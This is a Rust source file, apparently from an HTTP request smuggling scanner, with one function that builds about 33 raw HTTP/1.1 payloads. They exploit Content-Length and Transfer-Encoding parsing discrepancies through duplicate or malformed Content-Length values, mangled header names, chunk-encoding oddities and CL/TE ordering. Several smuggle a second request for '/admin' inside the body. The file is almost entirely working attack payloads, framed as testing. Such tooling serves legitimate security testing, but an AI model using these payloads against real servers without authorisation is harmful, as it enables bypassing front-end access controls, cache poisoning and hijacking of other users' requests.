use super::{format_cookies, format_custom_headers};

/// Generate Content-Length edge case payloads for parser discrepancy testing.
///
/// These payloads target edge cases in how proxies and servers parse
/// Content-Length values and handle CL/TE interactions.
pub fn get_cl_edge_case_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let headers_str = format_custom_headers(custom_headers);
    let cookies_str = format_cookies(cookies);

    let mut payloads = Vec::with_capacity(40);

    // === Multiple Content-Length headers ===

    // First CL=0, second CL=6 (smuggle body past CL:0)
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 0\r\nContent-Length: 6\r\n\r\nSMUGGL"
    ));

    // First CL=6, second CL=0 (reversed order)
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 6\r\nContent-Length: 0\r\n\r\nSMUGGL"
    ));

    // Three CL headers with conflicting values
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 0\r\nContent-Length: 6\r\nContent-Length: 0\r\n\r\nSMUGGL"
    ));

    // Duplicate CL with same value but smuggled body
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 6\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
    ));

    // === CL value parsing edge cases ===

    // Leading zeros: 06 instead of 6
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 06\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
    ));

    // Leading zeros: 006
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 006\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
    ));

    // Plus prefix: +6
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: +6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
    ));

    // Negative value: -1
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: -1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
    ));

    // Hex notation: 0x06
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 0x06\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
    ));

    // Decimal notation: 6.0
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 6.0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
    ));

    // Scientific notation: 6e0
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 6e0\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
    ));

    // Null byte suffix
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 6\x00\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
    ));

    // Trailing space
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 6 \r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
    ));

    // === CL: 0 with smuggled body ===

    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n"
    ));

    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n"
    ));

    // === CL with chunked body mismatch ===

    // CL says 5 bytes but body is chunked encoded
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 5\r\n\r\n1\r\nA\r\n0\r\n\r\n"
    ));

    // CL says 100 bytes but body is short chunked
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 100\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
    ));

    // === CL header name variations ===

    // Space before colon
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length : 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
    ));

    // Lowercase header name
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}content-length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
    ));

    // Underscore variation
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content_Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
    ));

    // No space after colon
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length:6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
    ));

    // Tab after colon
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length:\t6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
    ));

    // === Chunked body edge cases ===

    // Leading zeros in chunk size
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n001\r\nA\r\n0\r\n\r\n"
    ));

    // Chunk extension: ;ext=val
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n1;ext=val\r\nA\r\n0\r\n\r\n"
    ));

    // Multiple chunk extensions
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n1;a=b;c=d\r\nA\r\n0\r\n\r\n"
    ));

    // Trailers after final chunk
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\nTrailer: value\r\n\r\n"
    ));

    // Data after final 0-chunk
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n"
    ));

    // Uppercase hex chunk size
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\nA\r\n0123456789\r\n0\r\n\r\n"
    ));

    // Chunk size with leading whitespace
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n 1\r\nA\r\n0\r\n\r\n"
    ));

    // === TE + CL ordering variations ===

    // TE first, CL second
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Transfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nG"
    ));

    // CL first, TE second (standard CL.TE order)
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n"
    ));

    // TE with CL=0 and body
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Transfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\n1\r\nA\r\n0\r\n\r\n"
    ));

    // Large CL with short chunked body
    payloads.push(format!(
        "{method} {path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n{headers_str}{cookies_str}Content-Length: 999\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
    ));

    payloads
}
